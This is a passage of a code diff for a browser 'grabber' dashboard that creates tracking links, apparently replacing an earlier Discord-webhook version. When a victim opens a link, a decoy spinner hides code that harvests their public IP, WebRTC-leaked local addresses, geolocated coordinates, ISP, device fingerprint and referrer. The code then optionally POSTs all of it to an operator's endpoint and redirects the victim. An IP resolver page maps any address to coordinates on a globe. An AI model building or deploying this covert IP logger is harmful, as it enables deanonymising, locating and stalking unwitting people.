+          <button id="testEndpoint" style="margin-left:8px">
+            <svg viewBox="0 0 24 24">
+              <polyline points="22 12 18 12 15 21 9 3 6 12 2 12"/>
+            </svg>
+            Test
+          </button>
+        </div>
+
+        <h2 class="sec">data <span class="line"></span></h2>
+        <div class="card" style="padding:22px">
+          <div style="display:flex;gap:10px;flex-wrap:wrap">
+            <button id="exportBtn">
+              <svg viewBox="0 0 24 24">
+                <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+                <polyline points="7 10 12 15 17 10"/>
+                <line x1="12" y1="15" x2="12" y2="3"/>
+              </svg>
+              Export JSON
+            </button>
+            <button id="importBtn">
+              <svg viewBox="0 0 24 24">
+                <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+                <polyline points="17 8 12 3 7 8"/>
+                <line x1="12" y1="3" x2="12" y2="15"/>
+              </svg>
+              Import JSON
+            </button>
+            <button class="danger" id="wipeBtn">
+              <svg viewBox="0 0 24 24">
+                <path d="M3 6h18"/>
+                <path d="M8 6V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/>
+                <path d="m19 6-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/>
+              </svg>
+              Wipe all data
+            </button>
+          </div>
+        </div>
+
+        <h2 class="sec">about <span class="line"></span></h2>
+        <div class="card" style="padding:18px;font-size:11.5px;color:#888;line-height:1.8">
+          This dashboard stores everything locally in your browser by default.
+          To capture visitors from other devices, either (a) set a POST endpoint
+          above and host a tiny server, or (b) manually export/import JSON between
+          machines. All IP geolocation uses free public APIs.
+        </div>
+      </section>
+
+    </div>
+  </main>
 </div>
 
-<div id="info">
-  <h1>browser &amp; device info</h1>
-  <div class="sub">every value below is read in your browser and rendered only to you. no network requests are made.</div>
-  <div class="notice">
-    readable: user agent + client hints, screen, GPU, CPU/RAM, fonts, codecs, audio/canvas fingerprints,
-    permissions, media device counts, WebRTC leak.<br>
-    not readable by any web page: browsing history, other sites' cookies, saved passwords, autofill data.
-  </div>
-  <div class="bar">
-    <button id="copy">copy JSON</button>
-    <button id="dl">download JSON</button>
-    <button id="re">re-scan</button>
-    <button id="back">back</button>
-  </div>
-  <div id="iout"></div>
-  <section>
-    <h2>raw JSON</h2>
-    <pre id="json">scanning…</pre>
-  </section>
-  <canvas id="cv" width="280" height="60"></canvas>
+<!-- ═══ DECOY ═══ -->
+<div id="decoy" class="hidden">
+  <div class="spin"></div>
 </div>
 
+<input type="file" id="importFile" accept=".json,application/json" style="display:none">
+<div id="toasts"></div>
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
 <script>
 (function(){
-  "use strict";
+"use strict";
 
-  /* ═══════════════════════════════════════════════════════════
-     PASTE YOUR DISCORD WEBHOOK URL BETWEEN THE QUOTES BELOW.
-     ═══════════════════════════════════════════════════════════ */
-  const WEBHOOK = "";
+const KEY_CAPTURES = "dash_captures_v1";
+const KEY_LINKS    = "dash_links_v1";
+const KEY_ENDPOINT = "dash_endpoint_v1";
+const CHARS = "abcdefghijklmnopqrstuvwxyz0123456789";
+const $ = id => document.getElementById(id);
 
-  const STORE = "pw";
-  const CHARS = "abcdefghijklmnopqrstuvwxyz0123456789";
-  const WH_RE = /^https:\/\/(?:[\w-]+\.)*discord(?:app)?\.com\/api\/(?:v\d+\/)?webhooks\/\d+\/[\w-]+$/;
+/* ═══ STORAGE ═══ */
+const Store = {
+  getCaptures(){ try{ return JSON.parse(localStorage.getItem(KEY_CAPTURES)||"[]"); }catch(e){ return []; } },
+  setCaptures(a){ localStorage.setItem(KEY_CAPTURES, JSON.stringify(a)); },
+  addCapture(c){ const a = this.getCaptures(); a.unshift(c); if(a.length>1000) a.length=1000; this.setCaptures(a); },
+  clearCaptures(){ this.setCaptures([]); },
+  getLinks(){ try{ return JSON.parse(localStorage.getItem(KEY_LINKS)||"[]"); }catch(e){ return []; } },
+  setLinks(a){ localStorage.setItem(KEY_LINKS, JSON.stringify(a)); },
+  addLink(l){ const a = this.getLinks(); a.unshift(l); this.setLinks(a); },
+  clearLinks(){ this.setLinks([]); },
+  getEndpoint(){ try{ return localStorage.getItem(KEY_ENDPOINT)||""; }catch(e){ return ""; } },
+  setEndpoint(u){ localStorage.setItem(KEY_ENDPOINT, u||""); },
+};
 
-  const $ = id => document.getElementById(id);
-  const clean = s => (s || "").trim().replace(/\/+$/, "");
+/* ═══ TOAST ═══ */
+function toast(msg, type){
+  const el = document.createElement("div");
+  el.className = "toast" + (type==="err" ? " err" : "");
+  el.textContent = msg;
+  $("toasts").appendChild(el);
+  setTimeout(()=>{
+    el.style.transition = "opacity .25s, transform .25s";
+    el.style.opacity = "0";
+    el.style.transform = "translateX(30px)";
+    setTimeout(()=>el.remove(), 260);
+  }, 2600);
+}
 
-  /* ── snowfall (only on grabber page) ── */
-  (function(){
-    const c = $("snow"), x = c.getContext("2d");
-    let w, h, f = [];
-    function init(){
-      w = c.width = innerWidth;
-      h = c.height = innerHeight;
-      const n = Math.min(160, Math.floor(w*h/22000));
-      f = [];
-      for(let i=0;i<n;i++) f.push({
-        x: Math.random()*w, y: Math.random()*h,
-        r: Math.random()*1.5+0.3,
-        vy: Math.random()*0.5+0.15,
-        vx: Math.random()*0.3-0.15,
-        o: Math.random()*0.5+0.15
+/* ═══ HELPERS ═══ */
+function makeId(){
+  const a = new Uint8Array(4);
+  crypto.getRandomValues(a);
+  let s = "";
+  for(let i=0;i<4;i++) s += CHARS[a[i] % CHARS.length];
+  return s;
+}
+function esc(s){
+  if(s===null || s===undefined) return "";
+  return String(s).replace(/&/g,"&amp;").replace(/</g,"&lt;").replace(/>/g,"&gt;")
+    .replace(/"/g,"&quot;").replace(/'/g,"&#39;");
+}
+function timeAgo(ts){
+  const s = Math.floor((Date.now()-ts)/1000);
+  if(s<60) return s+"s ago";
+  if(s<3600) return Math.floor(s/60)+"m ago";
+  if(s<86400) return Math.floor(s/3600)+"h ago";
+  return Math.floor(s/86400)+"d ago";
+}
+function fmtTime(ts){ return new Date(ts).toLocaleString(); }
+function isV6(ip){ return ip && ip.indexOf(":") !== -1; }
+function isPriv(ip){
+  if(!ip) return true;
+  if(isV6(ip)) return /^(fe80|fc|fd)/i.test(ip) || ip==="::1";
+  const p = ip.split(".").map(Number);
+  if(p.length!==4 || p.some(isNaN)) return true;
+  return p[0]===10 || p[0]===127 ||
+         (p[0]===172 && p[1]>=16 && p[1]<=31) ||
+         (p[0]===192 && p[1]===168) ||
+         (p[0]===169 && p[1]===254);
+}
+
+const EYE_ON = `<svg viewBox="0 0 24 24"><path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7-10-7-10-7z"/><circle cx="12" cy="12" r="3"/></svg>`;
+const EYE_OFF = `<svg viewBox="0 0 24 24"><path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19m-6.72-1.07a3 3 0 1 1-4.24-4.24"/><line x1="1" y1="1" x2="23" y2="23"/></svg>`;
+
+/* ═══ LINK BUILDING ═══ */
+function buildLink(id){ return location.origin + location.pathname + "#" + id; }
+function linkHtml(url){
+  const i = url.indexOf("#");
+  if(i === -1) return esc(url);
+  const head = url.slice(0, i+1);
+  const hash = url.slice(i+1);
+  return esc(head) + '<span class="hash">' + esc(hash) + '</span>';
+}
+
+/* ═══ FETCH HELPERS ═══ */
+function fetchT(url, ms){
+  const ctrl = new AbortController();
+  const t = setTimeout(()=>ctrl.abort(), ms);
+  return fetch(url, {signal: ctrl.signal, cache:"no-store"}).finally(()=>clearTimeout(t));
+}
+
+/* ═══ MULTI-LAYER GEO RESOLVE ═══ */
+/* Queries 4 independent geolocation services in parallel. Each returns a
+   normalized record or null. Consensus = largest cluster of matching coords. */
+const GEO_SOURCES = [
+  {
+    name: "ipwho.is",
+    fetch: ip => fetchT(`https://ipwho.is/${ip}`, 4500)
+      .then(r => r.ok ? r.json() : null)
+      .then(d => (d && d.success !== false && d.ip) ? {
+        source:"ipwho.is",
+        city: d.city, region: d.region, country: d.country, cc: d.country_code,
+        lat: typeof d.latitude === "number" ? d.latitude : parseFloat(d.latitude),
+        lon: typeof d.longitude === "number" ? d.longitude : parseFloat(d.longitude),
+        isp: d.connection && d.connection.isp,
+        asn: d.connection && d.connection.asn,
+      } : null)
+  },
+  {
+    name: "ipapi.co",
+    fetch: ip => fetchT(`https://ipapi.co/${ip}/json/`, 4500)
+      .then(r => r.ok ? r.json() : null)
+      .then(d => (d && d.ip && !d.error) ? {
+        source:"ipapi.co",
+        city: d.city, region: d.region, country: d.country_name, cc: d.country_code,
+        lat: typeof d.latitude === "number" ? d.latitude : parseFloat(d.latitude),
+        lon: typeof d.longitude === "number" ? d.longitude : parseFloat(d.longitude),
+        isp: d.org, asn: d.asn,
+      } : null)
+  },
+  {
+    name: "freeipapi",
+    fetch: ip => fetchT(`https://freeipapi.com/api/json/${ip}`, 4500)
+      .then(r => r.ok ? r.json() : null)
+      .then(d => (d && d.ipAddress) ? {
+        source:"freeipapi",
+        city: d.cityName, region: d.regionName, country: d.countryName, cc: d.countryCode,
+        lat: typeof d.latitude === "number" ? d.latitude : parseFloat(d.latitude),
+        lon: typeof d.longitude === "number" ? d.longitude : parseFloat(d.longitude),
+        isp: null, asn: null,
+      } : null)
+  },
+  {
+    name: "geojs.io",
+    fetch: ip => fetchT(`https://get.geojs.io/v1/ip/geo/${ip}.json`, 4500)
+      .then(r => r.ok ? r.json() : null)
+      .then(d => (d && d.ip) ? {
+        source:"geojs.io",
+        city: d.city, region: d.region, country: d.country, cc: d.country_code,
+        lat: parseFloat(d.latitude),
+        lon: parseFloat(d.longitude),
+        isp: d.organization_name, asn: d.asn,
+      } : null)
+  },
+];
+
+async function multiResolve(ip){
+  const results = await Promise.all(
+    GEO_SOURCES.map(s =>
+      s.fetch(ip).catch(() => null)
+    )
+  );
+  const valid = results.filter(Boolean);
+  const failed = results.map((r,i) => r ? null : GEO_SOURCES[i].name).filter(Boolean);
+  return { sources: results, valid, failed };
+}
+
+/* Cluster valid sources by approximate location and compute consensus. */
+function computeConsensus(valid){
+  if(!valid.length) return null;
+  // Only consider records with usable coords
+  const withCoords = valid.filter(r =>
+    r.lat != null && r.lon != null && !isNaN(r.lat) && !isNaN(r.lon)
+  );
+  if(!withCoords.length){
+    // Fall back: majority-vote city/country
+    const c = {};
+    valid.forEach(r => { if(r.city) c[r.city] = (c[r.city]||0)+1; });
+    const top = Object.entries(c).sort((a,b)=>b[1]-a[1])[0];
+    return top ? {
+      lat:null, lon:null, city:top[0], country:null, region:null, cc:null,
+      isp: valid.find(r=>r.isp)?.isp,
+      asn: valid.find(r=>r.asn)?.asn,
+      agreeCount: top[1], totalSources: valid.length,
+      confidence: top[1] / valid.length,
+    } : null;
+  }
+  // Cluster by ~0.5° grid (≈ 55km)
+  const groups = new Map();
+  withCoords.forEach(r => {
+    const key = r.lat.toFixed(1) + "," + r.lon.toFixed(1);
+    if(!groups.has(key)) groups.set(key, []);
+    groups.get(key).push(r);
+  });
+  let best = [];
+  groups.forEach(g => { if(g.length > best.length) best = g; });
+  if(!best.length) best = withCoords;
+
+  const lat = best.reduce((s,r)=>s+r.lat, 0) / best.length;
+  const lon = best.reduce((s,r)=>s+r.lon, 0) / best.length;
+
+  // Majority-vote city & country across all valid
+  const cityCount = {}, countryCount = {}, ccCount = {};
+  valid.forEach(r => {
+    if(r.city) cityCount[r.city] = (cityCount[r.city]||0) + 1;
+    if(r.country) countryCount[r.country] = (countryCount[r.country]||0) + 1;
+    if(r.cc) ccCount[r.cc] = (ccCount[r.cc]||0) + 1;
+  });
+  const topCity = Object.entries(cityCount).sort((a,b)=>b[1]-a[1])[0]?.[0] || best[0].city || null;
+  const topCountry = Object.entries(countryCount).sort((a,b)=>b[1]-a[1])[0]?.[0] || best[0].country || null;
+  const topCC = Object.entries(ccCount).sort((a,b)=>b[1]-a[1])[0]?.[0] || best[0].cc || null;
+
+  return {
+    lat, lon,
+    city: topCity,
+    country: topCountry,
+    cc: topCC,
+    region: best[0].region || null,
+    isp: best.find(r=>r.isp)?.isp || valid.find(r=>r.isp)?.isp || null,
+    asn: best.find(r=>r.asn)?.asn || valid.find(r=>r.asn)?.asn || null,
+    agreeCount: best.length,
+    totalSources: valid.length,
+    confidence: best.length / valid.length,
+  };
+}
+
+/* ═══ GRABBER ═══ */
+function webrtcIPs(ms){
+  return new Promise(res=>{
+    const out = { local:[], stun:[] };
+    let pc;
+    try{
+      pc = new RTCPeerConnection({
+        iceServers:[
+          {urls:"stun:stun.l.google.com:19302"},
+          {urls:"stun:stun.cloudflare.com:3478"}
+        ]
       });
+    }catch(e){ return res(out); }
+    let done = false;
+    const fin = () => {
+      if(done) return; done = true;
+      try{ pc.close(); }catch(e){}
+      res({local:[...new Set(out.local)], stun:[...new Set(out.stun)]});
+    };
+    const t = setTimeout(fin, ms);
+    pc.onicecandidate = e => {
+      if(!e.candidate){ clearTimeout(t); return fin(); }
+      const ip = e.candidate.candidate.split(" ")[4];
+      if(!ip || /\.local$/i.test(ip)) return;
+      (isPriv(ip) ? out.local : out.stun).push(ip);
+    };
+    try{
+      pc.createDataChannel("x");
+      pc.createOffer().then(o => pc.setLocalDescription(o)).catch(()=>{});
+    }catch(e){ clearTimeout(t); fin(); }
+  });
+}
+async function getPublicIp(){
+  try{
+    const r = await fetchT("https://api.ipify.org?format=json", 3000);
+    if(r.ok){ const j = await r.json(); if(j.ip) return j.ip; }
+  }catch(e){}
+  try{
+    const r = await fetchT("https://ipv4.icanhazip.com", 3000);
+    if(r.ok){ const v = (await r.text()).trim(); if(v) return v; }
+  }catch(e){}
+  return null;
+}
+async function captureInfo(){
+  const n = navigator, s = screen;
+  const cn = n.connection || n.mozConnection || n.webkitConnection || {};
+  let tz = null;
+  try{ tz = Intl.DateTimeFormat().resolvedOptions().timeZone; }catch(e){}
+  const [rt, pub] = await Promise.all([webrtcIPs(2200), getPublicIp()]);
+  const geo = pub ? computeConsensus((await multiResolve(pub)).valid) : null;
+  let gpu = null;
+  try{
+    const c = document.createElement("canvas");
+    const gl = c.getContext("webgl") || c.getContext("experimental-webgl");
+    if(gl){
+      const d = gl.getExtension("WEBGL_debug_renderer_info");
+      gpu = d ? gl.getParameter(d.UNMASKED_RENDERER_WEBGL) : gl.getParameter(gl.RENDERER);
     }
-    function loop(){
-      x.clearRect(0,0,w,h);
-      x.fillStyle = "#fff";
-      for(const s of f){
-        x.globalAlpha = s.o;
-        x.beginPath();
-        x.arc(s.x, s.y, s.r, 0, 6.283);
-        x.fill();
-        s.y += s.vy; s.x += s.vx;
-        if(s.y > h+4){ s.y = -4; s.x = Math.random()*w; }
-        if(s.x < -4) s.x = w+4;
-        if(s.x > w+4) s.x = -4;
+  }catch(e){}
+  return {
+    id: makeId(), ts: Date.now(),
+    ip: pub, geo, webrtc: rt,
+    browser: {
+      userAgent:n.userAgent, language:n.language, languages:n.languages,
+      platform:n.platform, vendor:n.vendor, cores:n.hardwareConcurrency,
+      memory:n.deviceMemory, touch:n.maxTouchPoints, timezone:tz,
+    },
+    screen: {
+      size:s.width+"×"+s.height, avail:s.availWidth+"×"+s.availHeight,
+      viewport:innerWidth+"×"+innerHeight, dpr:devicePixelRatio, depth:s.colorDepth,
+    },
+    gpu,
+    conn: { type:cn.effectiveType, downlink:cn.downlink, rtt:cn.rtt },
+    page: { referrer: document.referrer || "direct", url: location.href },
+  };
+}
+async function runGrabber(id){
+  $("dash").classList.add("hidden");
+  $("decoy").classList.remove("hidden");
+  const links = Store.getLinks();
+  const link = links.find(l => l.id === id);
+  try{
+    const info = await captureInfo();
+    info.linkId = id;
+    if(link && link.label) info.label = link.label;
+    Store.addCapture(info);
+    const ep = Store.getEndpoint();
+    if(ep){
+      try{
+        await fetch(ep, {
+          method:"POST",
+          headers:{"Content-Type":"application/json"},
+          body: JSON.stringify(info),
+          mode:"cors",
+        });
+      }catch(e){}
+    }
+  }catch(e){}
+  if(link && link.dest){ location.replace(link.dest); }
+  else{
+    setTimeout(()=>{
+      document.body.style.background = "#000";
+      $("decoy").innerHTML = "";
+    }, 400);
+  }
+}
+
+/* ═══ NAV ═══ */
+const PAGE_TITLES = {
+  overview: ["Overview","dashboard"],
+  captures: ["Captures","dashboard / captures"],
+  links:    ["Create Link","dashboard / links"],
+  resolver: ["IP Resolver","dashboard / tools"],
+  settings: ["Settings","dashboard / settings"],
+};
+function setPage(name){
+  document.querySelectorAll("#nav a").forEach(a=>{
+    a.classList.toggle("active", a.dataset.page === name);
+  });
+  document.querySelectorAll(".page").forEach(p=>{
+    p.classList.toggle("active", p.dataset.page === name);
+  });
+  const t = PAGE_TITLES[name] || ["",""];
+  $("pageTitle").textContent = t[0];
+  $("pageCrumb").textContent = t[1];
+  $("sidebar").classList.remove("open");
+  if(name==="overview") renderOverview();
+  if(name==="captures") renderCaptures();
+  if(name==="links")    renderLinks();
+  if(name==="resolver") {
+    // Give the page a frame to lay out, then init/resize the globe
+    requestAnimationFrame(()=>{
+      initGlobe();
+      resizeGlobe();
+      renderGlobe();
+    });
+  }
+}
+
+/* ═══ OVERVIEW ═══ */
+function renderOverview(){
+  const caps = Store.getCaptures();
+  const links = Store.getLinks();
+  const uniq = new Set(caps.map(c=>c.ip).filter(Boolean)).size;
+  $("statTotal").textContent = caps.length;
+  $("statTotalSub").textContent = caps.length ? "all time" : "no captures yet";
+  $("statUnique").textContent = uniq;
+  $("statLinks").textContent = links.length;
+  $("statLast").textContent = caps.length ? timeAgo(caps[0].ts) : "—";
+  $("captureCount").textContent = caps.length;
+  const el = $("recentList");
+  if(!caps.length){
+    el.innerHTML = emptyState("No captures yet","Generate a tracking link and share it. Captures appear here.");
+    return;
+  }
+  el.innerHTML = caps.slice(0, 6).map(c => captureRow(c, false)).join("");
+  bindCaptureToggles(el);
+}
+
+/* ═══ CAPTURES ═══ */
+function emptyState(title, desc){
+  return `<div class="empty">
+    <svg viewBox="0 0 24 24">
+      <circle cx="12" cy="12" r="9"/>
+      <path d="M12 8v4"/>
+      <circle cx="12" cy="16" r=".5" fill="#2a2a2a"/>
+    </svg>
+    <div class="t">${esc(title)}</div>
+    <div class="d">${esc(desc)}</div>
+  </div>`;
+}
+function captureRow(c, expanded){
+  const ip = c.ip || "unknown";
+  const masked = ip.replace(/[0-9a-f]/gi, "•");
+  const loc = c.geo ? [c.geo.city, c.geo.region, c.geo.country].filter(Boolean).join(", ") : "";
+  const ua = c.browser && c.browser.userAgent ? c.browser.userAgent : "";
+  const shortUa = ua.length > 50 ? ua.slice(0, 50) + "…" : ua;
+  return `<div class="cap-item" data-ts="${c.ts}" style="margin-bottom:10px">
+    <table class="tbl" style="border-radius:${expanded?'11px 11px 0 0':'11px'}">
+      <tbody><tr>
+        <td style="width:180px">
+          <span class="ip">
+            <span class="ipv" data-ip="${esc(ip)}" data-masked="${esc(masked)}">${esc(masked)}</span>
+            <span class="eye" data-ts="${c.ts}" title="Reveal IP">${EYE_OFF}</span>
+          </span>
+        </td>
+        <td style="width:180px;color:#888">${esc(loc || "—")}</td>
+        <td style="color:#555;font-size:11px;max-width:220px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap">${esc(shortUa)}</td>
+        <td style="width:110px;color:#666;font-size:11px;text-align:right">${esc(timeAgo(c.ts))}</td>
+        <td style="width:44px;text-align:right">
+          <button class="sm cap-exp" data-ts="${c.ts}">${expanded?"−":"+"}</button>
+        </td>
+      </tr></tbody>
+    </table>
+    ${expanded ? captureDetails(c) : ""}
+  </div>`;
+}
+function captureDetails(c){
+  const b = c.browser || {}, s = c.screen || {}, g = c.geo || {};
+  const conn = c.conn || {}, rt = c.webrtc || {local:[],stun:[]};
+  const rows = [
+    ["captured at", fmtTime(c.ts)],
+    ["link id", c.linkId || "—"],
+    ["label", c.label || "—"],
+    ["ip", c.ip || "—"],
+    ["location", [g.city, g.region, g.country].filter(Boolean).join(", ") || "—"],
+    ["coordinates", g.lat!=null && g.lon!=null ? `${g.lat}, ${g.lon}` : "—"],
+    ["isp", g.isp || "—"],
+    ["asn", g.asn || "—"],
+    ["webrtc local", rt.local && rt.local.length ? rt.local.join(", ") : "—"],
+    ["webrtc stun", rt.stun && rt.stun.length ? rt.stun.join(", ") : "—"],
+    ["user agent", b.userAgent || "—"],
+    ["platform", b.platform || "—"],
+    ["language", (b.languages && b.languages.join(", ")) || b.language || "—"],
+    ["timezone", b.timezone || "—"],
+    ["cpu cores", b.cores || "—"],
+    ["device memory", b.memory ? "~" + b.memory + " GB" : "—"],
+    ["touch points", b.touch || 0],
+    ["gpu", c.gpu || "—"],
+    ["screen", s.size || "—"],
+    ["viewport", s.viewport || "—"],
+    ["pixel ratio", s.dpr || "—"],
+    ["color depth", s.depth ? s.depth + "-bit" : "—"],
+    ["connection", [conn.type, conn.downlink ? conn.downlink+"Mb/s" : null, conn.rtt ? conn.rtt+"ms" : null].filter(Boolean).join(" · ") || "—"],
+    ["referrer", (c.page && c.page.referrer) || "—"],
+  ];
+  return `<div class="drawer">
+    ${rows.map(([k,v]) => `<div class="row"><div class="k">${esc(k)}</div><div class="v">${esc(v)}</div></div>`).join("")}
+  </div>`;
+}
+
+let EXPANDED = new Set();
+let REVEALED = new Set();
+
+function bindCaptureToggles(root){
+  root.querySelectorAll(".eye").forEach(el=>{
+    el.addEventListener("click", ()=>{
+      const ts = Number(el.dataset.ts);
+      const ipEl = el.parentElement.querySelector(".ipv");
+      if(REVEALED.has(ts)){
+        REVEALED.delete(ts);
+        ipEl.textContent = ipEl.dataset.masked;
+        el.classList.remove("on");
+        el.innerHTML = EYE_OFF;
+      } else {
+        REVEALED.add(ts);
+        ipEl.textContent = ipEl.dataset.ip;
+        el.classList.add("on");
+        el.innerHTML = EYE_ON;
       }
-      requestAnimationFrame(loop);
+    });
+  });
+  root.querySelectorAll(".cap-exp").forEach(el=>{
+    el.addEventListener("click", ()=>{
+      const ts = Number(el.dataset.ts);
+      if(EXPANDED.has(ts)) EXPANDED.delete(ts); else EXPANDED.add(ts);
+      renderCaptures();
+    });
+  });
+}
+function renderCaptures(){
+  const caps = Store.getCaptures();
+  $("captureCount").textContent = caps.length;
+  const el = $("capturesList");
+  if(!caps.length){
+    el.innerHTML = emptyState("No captures yet","Generate a tracking link from the Create Link page.");
+    return;
+  }
+  el.innerHTML = caps.map(c => captureRow(c, EXPANDED.has(c.ts))).join("");
+  el.querySelectorAll(".eye").forEach(eye=>{
+    const ts = Number(eye.dataset.ts);
+    if(REVEALED.has(ts)){
+      const ipEl = eye.parentElement.querySelector(".ipv");
+      ipEl.textContent = ipEl.dataset.ip;
+      eye.classList.add("on");
+      eye.innerHTML = EYE_ON;
     }
-    addEventListener("resize", init);
-    init(); loop();
-  })();
+  });
+  bindCaptureToggles(el);
+}
 
-  /* ── shared helpers ── */
-  function makeId(){
-    const a = new Uint8Array(4);
-    crypto.getRandomValues(a);
-    let s = "";
-    for(let i=0;i<4;i++) s += CHARS[a[i] % CHARS.length];
-    return s;
+/* ═══ LINKS ═══ */
+function renderLinks(){
+  const links = Store.getLinks();
+  const el = $("linksList");
+  if(!links.length){
+    el.innerHTML = emptyState("No links yet","Generate one above to start tracking.");
+    return;
+  }
+  el.innerHTML = links.map(l=>{
+    const url = buildLink(l.id);
+    const caps = Store.getCaptures().filter(c=>c.linkId===l.id).length;
+    return `<div class="card" style="padding:16px;margin-bottom:10px">
+      <div style="display:flex;align-items:center;gap:12px;margin-bottom:12px">
+        <span style="color:#fff;font-weight:600">${esc(l.label || l.id)}</span>
+        <span class="pill ok">${caps} hit${caps===1?'':'s'}</span>
+        <span class="pill">#${esc(l.id)}</span>
+        <span style="flex:1"></span>
+        <span style="font-size:10px;color:#555">${esc(timeAgo(l.ts))}</span>
+      </div>
+      <div class="linkout">
+        <div class="url">${linkHtml(url)}</div>
+        <button class="copy sm" data-url="${esc(url)}">
+          <svg viewBox="0 0 24 24">
+            <rect x="9" y="9" width="12" height="12" rx="2"/>
+            <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
+          </svg>
+          Copy
+        </button>
+        <button class="sm danger" data-del="${esc(l.id)}">
+          <svg viewBox="0 0 24 24">
+            <path d="M3 6h18"/>
+            <path d="m19 6-1 14a2 2 0 0 1-2 2H8a2 2 0 0 1-2-2L5 6"/>
+          </svg>
+        </button>
+      </div>
+      ${l.dest ? `<div style="font-size:10.5px;color:#666;margin-top:10px">→ redirects to ${esc(l.dest)}</div>` : ""}
+    </div>`;
+  }).join("");
+  el.querySelectorAll(".copy").forEach(b=>{
+    b.addEventListener("click", ()=>{
+      navigator.clipboard.writeText(b.dataset.url).then(
+        ()=>toast("Link copied"),
+        ()=>toast("Copy blocked","err")
+      );
+    });
+  });
+  el.querySelectorAll("[data-del]").forEach(b=>{
+    b.addEventListener("click", ()=>{
+      const id = b.dataset.del;
+      Store.setLinks(Store.getLinks().filter(x=>x.id!==id));
+      renderLinks();
+      toast("Link deleted");
+    });
+  });
+}
+
+/* ═══ RESOLVER ═══ */
+async function doResolve(){
+  const ip = $("resolveIp").value.trim();
+  const out = $("resolveOut");
+  if(!ip){ toast("Enter an IP","err"); return; }
+  out.innerHTML = `<div class="card" style="padding:22px;text-align:center;color:#777">
+    <span class="spin"></span> querying 4 sources for ${esc(ip)}…</div>`;
+
+  // Resolve via all sources
+  const { sources, valid, failed } = await multiResolve(ip);
+  const consensus = computeConsensus(valid);
+
+  if(!consensus){
+    out.innerHTML = `<div class="card" style="padding:22px;color:#888">Could not resolve ${esc(ip)}</div>`;
+    // Clear globe pins
+    RESOLVER_PINS = [];
+    renderGlobe();
+    $("globeFocus").style.display = "none";
+    return;
   }
 
-  function resolveWh(){
-    const baked = clean(WEBHOOK);
-    if(baked && WH_RE.test(baked)) return baked;
-    try{
-      const s = clean(localStorage.getItem(STORE));
-      if(s && WH_RE.test(s)) return s;
-    }catch(e){}
-    return "";
+  // Store pins for the globe
+  RESOLVER_PINS = valid
+    .filter(r => r.lat != null && r.lon != null && !isNaN(r.lat) && !isNaN(r.lon))
+    .map(r => ({ lat: r.lat, lon: r.lon, source: r.source }));
+
+  // Render results
+  const confPct = Math.round(consensus.confidence * 100);
+  const confLabel =
+    confPct >= 75 ? "high" :
+    confPct >= 50 ? "medium" : "low";
+
+  const mainRows = [
+    ["ip", ip],
+    ["location", [consensus.city, consensus.region, consensus.country].filter(Boolean).join(", ") || "—"],
+    ["coordinates", consensus.lat!=null && consensus.lon!=null
+      ? consensus.lat.toFixed(4) + ", " + consensus.lon.toFixed(4) : "—"],
+    ["isp", consensus.isp || "—"],
+    ["asn", consensus.asn || "—"],
+    ["agreement", `${consensus.agreeCount} of ${consensus.totalSources} sources`],
+  ];
+
+  const sourcesHtml = sources.map(r => {
+    if(!r) return `<div class="src err">
+      <div class="name"><span class="dot"></span>unavailable</div>
+      <div class="loc">—</div>
+      <div class="coord">no response</div>
+    </div>`;
+    const isConsensus = consensus.lat != null
+      && Math.abs((r.lat||0) - consensus.lat) < 0.5
+      && Math.abs((r.lon||0) - consensus.lon) < 0.5;
+    return `<div class="src${isConsensus?' consensus':''}">
+      <div class="badge">${isConsensus?'match':'differ'}</div>
+      <div class="name"><span class="dot"></span>${esc(r.source)}</div>
+      <div class="loc">${esc([r.city, r.country].filter(Boolean).join(", ") || "—")}</div>
+      <div class="coord">${r.lat!=null && r.lon!=null ? r.lat.toFixed(3)+", "+r.lon.toFixed(3) : "no coords"}</div>
+    </div>`;
+  }).join("");
+
+  out.innerHTML = `
+    <div class="card" style="padding:22px">
+      <div style="display:flex;align-items:center;gap:12px;margin-bottom:14px">
+        <div style="flex:1">
+          <div style="font-size:10px;color:#666;letter-spacing:.12em;text-transform:uppercase;font-weight:600">consensus location</div>
+          <div style="font-size:18px;color:#fff;font-weight:600;margin-top:6px">
+            ${esc([consensus.city, consensus.country].filter(Boolean).join(", ") || "unknown")}
+          </div>
+        </div>
+        <span class="pill ${confLabel==='high'?'ok':confLabel==='medium'?'warn':'bad'}">${confPct}% · ${confLabel}</span>
+      </div>
+      <div class="conf">
+        <span>agreement</span>
+        <div class="bar"><div class="fill" style="width:${confPct}%"></div></div>
+        <span class="val">${consensus.agreeCount}/${consensus.totalSources}</span>
+      </div>
+      <div style="margin-top:18px">
+        ${mainRows.map(([k,v]) => `<div class="row" style="display:flex;gap:14px;padding:5px 0;border-bottom:1px solid #0e0e0e;font-size:11.5px">
+          <div style="flex:0 0 140px;color:#555">${esc(k)}</div>
+          <div style="flex:1;color:#ddd;font-family:ui-monospace,monospace;word-break:break-word">${esc(v)}</div>
+        </div>`).join("")}
+      </div>
+    </div>
+    <h2 class="sec" style="margin-top:22px">source breakdown <span class="line"></span></h2>
+    <div class="sources">${sourcesHtml}</div>
+    <div style="margin-top:16px;display:flex;gap:10px;flex-wrap:wrap">
+      <button class="primary" id="focusPin">
+        <svg viewBox="0 0 24 24">
+          <circle cx="12" cy="12" r="3"/>
+          <path d="M12 2v3M12 19v3M2 12h3M19 12h3"/>
+        </svg>
+        Focus on map
+      </button>
+      <button id="copyCoords">
+        <svg viewBox="0 0 24 24">
+          <rect x="9" y="9" width="12" height="12" rx="2"/>
+          <path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/>
+        </svg>
+        Copy coordinates
+      </button>
+    </div>
+  `;
+
+  // Wire buttons
+  $("focusPin").addEventListener("click", ()=>{
